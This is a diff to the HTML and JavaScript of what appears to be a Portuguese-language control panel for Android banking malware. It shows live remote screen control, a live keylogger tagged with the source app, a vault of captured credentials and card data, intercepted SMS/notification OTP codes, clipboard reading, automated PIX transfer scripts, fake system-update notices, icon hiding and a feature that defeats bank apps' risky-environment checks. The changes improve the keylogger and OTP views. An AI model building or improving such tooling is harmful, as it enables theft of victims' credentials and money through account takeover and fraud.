@@ -5,22 +5,24 @@
 *{box-sizing:border-box;margin:0}
 :root{--bg:#0a0c10;--pn:#11151b;--pn2:#161c24;--ln:#232c38;--tx:#c3ccd8;--dim:#6a7686;--ac:#3d8bfd;--ok:#2ea043;--warn:#d29922;--err:#f85149}
 body{background:var(--bg);color:var(--tx);font:12px/1.45 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
-header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap}
+header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap;flex:none}
 #brand{font-weight:700;letter-spacing:.4px;color:#fff;font-size:13px;margin-right:4px}
 #brand i{color:var(--ac);font-style:normal}
 .grp{display:flex;gap:4px;padding-left:8px;border-left:1px solid var(--ln)}
-#mais{display:flex;gap:4px;padding:5px 10px;background:#0d1116;border-bottom:1px solid var(--ln);flex-wrap:wrap}
+#mais{display:flex;gap:4px;padding:5px 10px;background:#0d1116;border-bottom:1px solid var(--ln);flex-wrap:wrap;flex:none}
 #mais[hidden]{display:none}
-main{flex:1;display:flex;min-height:0}
+main{flex:1;display:flex;min-height:0;min-width:0}
 nav{width:78px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px;overflow:auto;flex:none}
-nav b{padding:8px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:10px;border-left:2px solid transparent}
+nav b{padding:8px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:10px;border-left:2px solid transparent;position:relative}
 nav b.on{color:var(--ac);border-left-color:var(--ac);background:var(--pn2)}
 nav b:hover{color:var(--tx);background:var(--pn2)}
-#wrap{flex:1;min-width:0;min-height:0;position:relative;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden}
+nav b em{display:none;position:absolute;top:2px;right:2px;background:var(--ac);color:#fff;font-style:normal;font-size:8px;border-radius:6px;padding:0 3px}
+nav b.em em{display:block}
+#wrap{flex:1 1 0;min-width:0;min-height:0;position:relative;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden}
 #wrap.zoom{align-items:flex-start;justify-content:flex-start;overflow:auto}
-#scr{display:block;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none;max-width:none;max-height:none}
+#scr{display:block;width:auto;height:auto;max-width:100%;max-height:100%;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none}
 #st{position:absolute;left:0;bottom:0;padding:2px 8px;font:11px monospace;color:var(--warn);pointer-events:none;background:#000000aa}
-#tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap}
+#tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap;flex:none}
 aside{width:392px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0;flex:none}
 #hd{display:flex;gap:6px;align-items:center;padding:6px 8px;border-bottom:1px solid var(--ln)}
 #hd h2{font-size:12px;font-weight:600;color:#fff;flex:1}
@@ -47,9 +49,9 @@ input{flex:1;cursor:text}
 #toast{position:fixed;right:12px;bottom:12px;display:flex;flex-direction:column;gap:5px;z-index:9;pointer-events:none}
 #toast div{background:#1b232d;border:1px solid #2d3a49;color:#dbe3ec;padding:5px 9px;border-radius:5px;font-size:11px}
 .tap{position:absolute;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid var(--ac);border-radius:50%;pointer-events:none}
-#klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
-.kh{color:var(--ac);margin:6px 0 2px;border-bottom:1px solid #1a2029;padding-bottom:2px}
-.krow{padding:1px 0}
+#klist{font:11.5px monospace;white-space:pre-wrap;word-break:break-all;line-height:1.55}
+.kh{color:var(--ac);margin:8px 0 3px;border-bottom:1px solid #1a2029;padding-bottom:2px;font-size:10px}
+.kf{color:#9fd0ff}
 #snapbox{display:none;border-top:1px solid var(--ln);padding:6px;background:#0a0e13}
 #snappre{max-height:210px;overflow:auto;font:11px monospace;margin:4px 0;background:#05070a;padding:6px;border-radius:5px}
 #snappre div{cursor:pointer;white-space:pre}
@@ -65,7 +67,16 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 .aj b{color:#fff;font-weight:600;flex:0 0 130px}
 .aj span{flex:1;color:var(--dim)}
 body.somente header,body.somente nav,body.somente aside,body.somente #tbar{display:none}
-body.somente #wrap{background:#000}
+body.semAside aside{display:none}
+@media (max-width:1200px){aside{width:320px}}
+@media (max-width:900px){
+  main{flex-direction:column}
+  nav{width:auto;flex-direction:row;overflow-x:auto;overflow-y:hidden;border-right:0;border-bottom:1px solid var(--ln);padding:0;flex:none}
+  nav b{flex:0 0 auto;padding:7px 9px;border-left:0;border-bottom:2px solid transparent}
+  nav b.on{border-left:0;border-bottom-color:var(--ac)}
+  #wrap{min-height:38vh}
+  aside{width:auto;height:40vh;border-left:0;border-top:1px solid var(--ln)}
+}
 </style>
 <header>
 <span id=brand>p<i>a</i>inel</span>
@@ -74,7 +85,8 @@ body.somente #wrap{background:#000}
 <button class=dg title="Para a transmissão, bloqueia a tela e limpa o painel" onclick="c('off')">Desligar</button>
 <button title="Acorda a tela do aparelho" onclick="c('screen',{on:true})">Acordar</button></span>
 <span class=grp><button onclick="zoom(-1)" title="Diminuir zoom">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)" title="Aumentar zoom">+</button></span>
-<button id=so title="Esconde tudo e mostra so a tela (Esc sai)" onclick="soTela()">só tela</button>
+<button id=so title="Esconde tudo e mostra só a tela (Esc sai)" onclick="soTela()">só tela</button>
+<button id=sp title="Mostra ou esconde o painel lateral" onclick="document.body.classList.toggle('semAside');setTimeout(fit,80)">painel</button>
 <button id=mg title="Ímã: encaixa o toque no elemento mais próximo" onclick="mag=!mag;this.classList.toggle('on',mag)">ímã</button>
 <button onclick="document.getElementById('mais').hidden=!document.getElementById('mais').hidden">mais opções</button>
 </header>
@@ -94,7 +106,7 @@ body.somente #wrap{background:#000}
 <main>
 <nav>
 <b class=on data-v=live>ao vivo</b><b data-v=arvore>árvore</b><b data-v=cofre>cofre</b><b data-v=otp>otp</b><b data-v=pix>pix</b>
-<b data-v=arq>arquivos</b><b data-v=apps>apps</b><b data-v=info>info</b><b data-v=tecla>teclado</b>
+<b data-v=arq>arquivos</b><b data-v=apps>apps</b><b data-v=info>info</b><b data-v=tecla id=tb>teclado<em id=kb>0</em></b>
 <b data-v=perfil>perfis</b><b data-v=recon>recon</b><b data-v=banco>banco</b><b data-v=cfg>ajustes</b><b data-v=ajuda>ajuda</b>
 </nav>
 <div id=wrap><img id=scr><div id=st></div></div>
@@ -119,7 +131,11 @@ body.somente #wrap{background:#000}
 <div class=ln><button onclick="baixaCofre()">Exportar json</button><button class=dg onclick="limpaCofre()">Limpar</button></div>
 <div id=cl></div>
 </div>
-<div id=v-otp style=display:none><div class=ln><button onclick="carregaCofre('otp')">Atualizar</button></div><div id=ol></div></div>
+<div id=v-otp style=display:none>
+<div class=ln><button onclick="carregaCofre('otp')">Atualizar</button></div>
+<div class="ln leg">códigos recebidos por SMS ou notificação</div>
+<div id=ol></div>
+</div>
 <div id=v-pix style=display:none>
 <div class=ln><select id=pfl></select></div>
 <div class=ln><input id=pch placeholder="chave pix"><input id=pvl placeholder="valor" style="flex:0 0 90px"></div>
@@ -136,8 +152,9 @@ body.somente #wrap{background:#000}
 <div id=v-info style=display:none><pre id=out3></pre></div>
 <div id=v-tecla style=display:none>
 <div class=ln><button onclick="kpause=!kpause;this.textContent=kpause?'Retomar':'Pausar'">Pausar</button>
-<button onclick="fetch('/keys/clear?t='+T)">Limpar</button><button onclick="location.href='/keys/dl?t='+T">Baixar log</button></div>
-<div class="ln leg">chega ao vivo; o arquivo teclado.log guarda tudo</div>
+<button onclick="limpaTeclas()">Limpar</button><button onclick="location.href='/keys/dl?t='+T">Baixar log</button>
+<button onclick="c('clip')" title="Lê a área de transferência do aparelho">Área de transferência</button></div>
+<div class="ln leg">chega ao vivo enquanto você digita no aparelho &middot; linhas com = são o conteúdo do campo &middot; o arquivo teclado.log guarda tudo</div>
 <div id=klist></div>
 </div>
 <div id=v-perfil style=display:none>
@@ -168,6 +185,7 @@ body.somente #wrap{background:#000}
 <div class=aj><b>Desligar</b><span>para a transmissão, bloqueia a tela do aparelho e limpa o painel</span></div>
 <div class=aj><b>Acordar</b><span>acende a tela sem desbloquear</span></div>
 <div class=aj><b>só tela</b><span>esconde o painel inteiro e deixa apenas a imagem; Esc volta</span></div>
+<div class=aj><b>painel</b><span>mostra ou esconde a coluna lateral, para dar mais espaço à imagem</span></div>
 <div class=aj><b>ímã</b><span>puxa o toque para o elemento clicável mais próximo; útil em tela densa, atrapalha em jogo</span></div>
 <div class=aj><b>Voltar / Home / Recentes</b><span>botões do sistema</span></div>
 <div class=aj><b>Notificações</b><span>abre a gaveta de notificações</span></div>
@@ -176,7 +194,7 @@ body.somente #wrap{background:#000}
 <div class=aj><b>Lanterna</b><span>liga e desliga o flash</span></div>
 <div class=aj><b>Ocultar ícone</b><span>tira o app da gaveta; para reabrir, use a tela de setup</span></div>
 <div class=aj><b>árvore</b><span>lê os elementos da tela por texto e permite tocar neles, inclusive em partes invisíveis ao olho. é o caminho quando a imagem não ajuda</span></div>
-<div class=aj><b>teclado</b><span>mostra o que está sendo digitado, ao vivo</span></div>
+<div class=aj><b>teclado</b><span>mostra ao vivo o que está sendo digitado, com o app e a tela de origem</span></div>
 <div class=aj><b>banco</b><span>desliga os sinais que fazem o app do banco acusar ambiente em risco e reabre o banco</span></div>
 <div class=aj><b>cofre / otp</b><span>credenciais e códigos capturados</span></div>
 <div class=aj><b>pix</b><span>roteiros automáticos de transferência</span></div>
@@ -192,7 +210,7 @@ body.somente #wrap{background:#000}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),wrap=$('#wrap');
-let w,sel='',geo={w:0,h:0},lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null;
+let w,sel='',geo={w:0,h:0},lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null,kN=0;
 function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
 function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
 function co(){
@@ -213,12 +231,12 @@ function co(){
       if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
       else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
       return}
-    if(m.k==='key'){kl.push(m.d);if(kl.length>500)kl.shift();if(vNow==='tecla'&&!kpause)kdesenha();return}
+    if(m.k==='key'){recebeTecla(m.d);return}
     if(m.k!=='log')return;
     const x=m.d;
     if(x.t==='hello'){log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
       geo={w:x.w,h:x.h};if(!sel&&x.id){dev.value=x.id;pick()}}
-    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h};ajusta()}
+    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h};fit()}
     else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
     else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
     else if(x.t==='ka'){}
@@ -229,7 +247,7 @@ function co(){
     else if(x.t==='dl'){baixa(x.o)}
     else if(x.t==='tree'){nos=x.o||[];if(vNow==='arvore')desenhaArv()}
     else if(x.t==='bank'){$('#bankout').textContent=x.o}
-    else if(x.t==='k'){if(vNow==='tecla'&&!kpause)kcarrega()}
+    else if(x.t==='k'){kcarrega()}
     else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
     else if(x.t==='otp'){cofre.unshift({_t:'otp',v:x.o});desenhaCofre();toq('otp recebido')}
     else if(x.t==='clip'){cofre.unshift({_t:'clip',v:x.o});desenhaCofre()}
@@ -242,17 +260,20 @@ function co(){
 function frame(d){
   lf=Date.now();st.textContent='';
   const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
-  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null;ajusta()};i.src=u;
+  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null;fit()};i.src=u;
   if(recs&&recs.cv)recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
-function ajusta(){
-  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return;
-  const W=wrap.clientWidth,H=wrap.clientHeight;if(!W||!H)return;
+function fit(){
+  const nx=i.naturalWidth,ny=i.naturalHeight;
+  if(!nx||!ny)return;
+  if(z<=1){i.style.width='';i.style.height='';wrap.classList.remove('zoom');return}
+  const W=wrap.clientWidth||1,H=wrap.clientHeight||1;
   const s=Math.min(W/nx,H/ny)*z;
-  i.style.width=Math.max(1,Math.floor(nx*s))+'px';
-  i.style.height=Math.max(1,Math.floor(ny*s))+'px';
-  wrap.classList.toggle('zoom',z>1);
+  i.style.width=Math.round(nx*s)+'px';
+  i.style.height=Math.round(ny*s)+'px';
+  wrap.classList.add('zoom');
 }
-addEventListener('resize',ajusta);
+addEventListener('resize',fit);
+if(window.ResizeObserver)new ResizeObserver(fit).observe(wrap);
 setInterval(()=>{
   if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
   else if(!lf||Date.now()-lf>2500){st.textContent='sem imagens';dot.className='dot w'}
@@ -262,7 +283,7 @@ function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'ne
 dev.onchange=pick;
 function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
 function k(n){c('key',{code:n});push({k:n})}
-function soTela(){document.body.classList.toggle('somente');$('#so').classList.toggle('on',document.body.classList.contains('somente'));setTimeout(ajusta,60)}
+function soTela(){document.body.classList.toggle('somente');$('#so').classList.toggle('on',document.body.classList.contains('somente'));setTimeout(fit,60)}
 addEventListener('keydown',e=>{if(e.key==='Escape'&&document.body.classList.contains('somente'))soTela()});
 function go(v){vNow=v;
   document.querySelectorAll('nav b').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
@@ -271,7 +292,8 @@ function go(v){vNow=v;
   $('#ht').textContent=v;
   clearInterval(kt);
   if(v==='arvore'){c('tree');kt=setInterval(()=>{if($('#ar').checked)c('tree')},1500)}
-  if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,1500)}
+  if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,1500);marcaTecla(0);$('#hx').textContent='ao vivo'}
+  else $('#hx').textContent='';
   if(v==='cofre')carregaCofre();
   if(v==='otp')carregaCofre('otp');
   if(v==='apps')c('apps');
@@ -290,12 +312,9 @@ function send(){const e=$('#t'),v=e.value;
   else {c('text',{s:v});push({x:v});e.value=''}
 }
 $('#t').onkeydown=e=>{if(e.key==='Enter')send()};
-function geoPronto(){
-  if(!geo.w||!geo.h){c('geo');toq('aguardando a resolução do aparelho');return false}
-  return true;
-}
 function pt(e){
-  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!geo.w||!geo.h)return null;
+  if(!geo.w||!geo.h){c('geo');toq('aguardando a resolução do aparelho');return null}
+  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return null;
   const r=i.getBoundingClientRect();if(!r.width||!r.height)return null;
   const fx=(e.clientX-r.left)/r.width, fy=(e.clientY-r.top)/r.height;
   if(fx<0||fy<0||fx>1||fy>1)return null;
@@ -308,19 +327,18 @@ function snapP(p){
   return (b&&d<18)?{x:b.x,y:b.y}:p;
 }
 function mark(p){
-  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return;
-  const r=i.getBoundingClientRect(),wr=wrap.getBoundingClientRect();
+  const r=i.getBoundingClientRect(),wr=wrap.getBoundingClientRect();if(!r.width)return;
   const d=document.createElement('div');d.className='tap';
   d.style.left=(wrap.scrollLeft+r.left-wr.left+p.x/geo.w*r.width)+'px';
   d.style.top=(wrap.scrollTop+r.top-wr.top+p.y/geo.h*r.height)+'px';
   wrap.appendChild(d);setTimeout(()=>d.remove(),420)}
-function zoom(n){z=Math.min(4,Math.max(1,z+n));$('#z').textContent=z+'x';ajusta()}
+function zoom(n){z=Math.min(4,Math.max(1,z+n));$('#z').textContent=z+'x';fit()}
 function avPreset(n){
   const a=[['Atualização do sistema','Atualização instalada. Reinicie o aplicativo.'],
            ['Serviços do sistema','Sincronizando dados da conta...']][n];
   c('aviso',{ti:a[0],tx:a[1]})}
 let dn=null,t0=0,env=null,jaEnviado=false;
-i.onpointerdown=e=>{e.preventDefault();if(!geoPronto())return;dn=snapP(pt(e));t0=Date.now();jaEnviado=false;if(dn)mark(dn);
+i.onpointerdown=e=>{e.preventDefault();dn=snapP(pt(e));t0=Date.now();jaEnviado=false;if(dn)mark(dn);
   clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;c('touch',{x:dn.x,y:dn.y})},130)};
 i.onpointermove=e=>{if(!dn)return;const u=snapP(pt(e));if(u&&Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
 i.onpointerup=e=>{clearTimeout(env);if(!dn)return;const u=snapP(pt(e));if(!u){dn=null;return}
@@ -338,14 +356,36 @@ function rec(){
   r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);a.download='sessao.webm';a.click()};
   r.start();r.cv=cv;recs=r;st.textContent='gravando'}
 function bankOn(){const p=$('#bpkg').value.trim();$('#bankout').textContent='ativando...';c('bank',{pkg:p});toq('evasão ativada')}
+function marcaTecla(n){kN=n;$('#kb').textContent=n>99?'99+':n;$('#tb').classList.toggle('em',n>0)}
+function recebeTecla(d){
+  kl.push(d);if(kl.length>800)kl.shift();
+  marcaTecla(kN+1);
+  if(vNow==='tecla'&&!kpause)kdesenha();
+}
 function kdesenha(){
-  const f=$('#klist');f.innerHTML='';let ultimo='';
-  kl.forEach(l=>{const cab=(l.win||'?');if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');h.className='kh';h.textContent='-- '+(l.pkg||'?')+' / '+cab+' --';f.appendChild(h)}
-    const d=document.createElement('div');d.className='krow';d.appendChild(document.createTextNode((l.h?l.h+' ':'')+(l.o||'')));f.appendChild(d)});
-  f.scrollTop=f.scrollHeight}
+  const f=$('#klist');if(!f)return;
+  f.innerHTML='';
+  if(!kl.length){f.textContent='nenhuma tecla recebida ainda. digite no aparelho com o painel aberto.';return}
+  let ultimo='';
+  kl.forEach(l=>{
+    const cab=(l.pkg||'?')+' / '+(l.win||'?');
+    if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');h.className='kh';h.textContent='-- '+cab+' --';f.appendChild(h)}
+    const d=document.createElement('div');
+    if((l.o||'').startsWith('=')){d.className='kf'}
+    d.textContent=(l.h?l.h+' ':'')+(l.o||'');
+    f.appendChild(d)});
+  f.scrollTop=f.scrollHeight;
+}
 function kcarrega(){
-  fetch('/keys?t='+T+'&n=600'+(sel?'&dev='+encodeURIComponent(sel):''))
-  .then(r=>r.json()).then(j=>{if(j.l.length===kAt&&vNow==='tecla')return;kAt=j.l.length;kdesenha()}).catch(()=>{})}
+  fetch('/keys?t='+T+'&n=800'+(sel?'&dev='+encodeURIComponent(sel):''))
+  .then(r=>r.json()).then(j=>{
+    if(j.l.length===kAt)return;
+    kAt=j.l.length;
+    kl=j.l.map(function(x){var p=x.split('\t');
+      return {h:(p[0]||'').slice(11),pkg:(p[2]||'?').split('/')[0],win:(p[2]||'?').split('/')[1]||'?',o:p[3]||''}});
+    if(vNow==='tecla'&&!kpause)kdesenha();
+  }).catch(()=>{})}
+function limpaTeclas(){fetch('/keys/clear?t='+T).then(()=>{kl=[];kAt=0;marcaTecla(0);kdesenha();toq('log limpo')})}
 function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
 function lista(o){
   const f=$('#flist');f.innerHTML='';
@@ -404,18 +444,21 @@ function carregaCofre(tipo){
   fetch('/cofre?t='+T+(tipo?'&tipo='+tipo:'')).then(r=>r.json()).then(j=>{
     cofre=j.l;desenhaCofre()}).catch(()=>{})}
 function desenhaCofre(){
-  const q=($('#cf').value||'').toLowerCase(),alvo=$('#cl');if(!alvo)return;
-  alvo.innerHTML='';
-  cofre.filter(x=>!q||JSON.stringify(x).toLowerCase().includes(q)).forEach(x=>{
-    const d=document.createElement('div');d.className='card';
-    const t=document.createElement('div');t.className='t';t.textContent=x.v||'(vazio)';
-    const m=document.createElement('div');m.className='m';
-    m.textContent=(x._t||'?')+' · '+(x.app||x._dev||'')+(x.campo?' · '+x.campo:'')+' · '+(x._h||'');
-    const a=document.createElement('div');a.className='a';
-    const b1=document.createElement('button');b1.textContent='copiar';
-    b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
-    a.appendChild(b1);
-    d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})}
+  const q=($('#cf').value||'').toLowerCase();
+  ['cl','ol'].forEach(id=>{
+    const alvo=$('#'+id);if(!alvo)return;
+    alvo.innerHTML='';
+    cofre.filter(x=>!q||JSON.stringify(x).toLowerCase().includes(q)).forEach(x=>{
+      if(id==='ol'&&x._t!=='otp')return;
+      const d=document.createElement('div');d.className='card';
+      const t=document.createElement('div');t.className='t';t.textContent=x.v||'(vazio)';
+      const m=document.createElement('div');m.className='m';
+      m.textContent=(x._t||'?')+' · '+(x.app||x._dev||'')+(x.campo?' · '+x.campo:'')+' · '+(x._h||'');
+      const a=document.createElement('div');a.className='a';
+      const b1=document.createElement('button');b1.textContent='copiar';
+      b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
+      a.appendChild(b1);
+      d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})})}
 function baixaCofre(){
   const a=document.createElement('a');
   a.href=URL.createObjectURL(new Blob([JSON.stringify(cofre,null,1)],{type:'application/json'}));
